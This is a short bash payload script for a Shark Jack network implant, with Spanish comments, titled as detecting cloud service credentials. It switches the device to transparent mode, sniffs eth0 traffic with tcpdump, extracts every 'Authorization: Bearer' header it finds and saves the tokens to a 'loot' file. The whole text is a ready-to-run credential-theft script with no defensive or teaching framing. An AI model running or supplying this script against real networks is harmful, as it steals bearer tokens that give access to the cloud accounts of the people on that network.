#!/bin/bash
# Shark Jack script: Detect Cloud Service Credentials

LED SETUP
# Configurar la interfaz de red en modo TRANSPARENT
NETMODE TRANSPARENT
LED ATTACK

# Iniciar captura de paquetes y buscar encabezados de autorización HTTP
tcpdump -i eth0 -A -l | grep -i "Authorization: Bearer" >> /root/loot/cloud_creds.txt

LED FINISH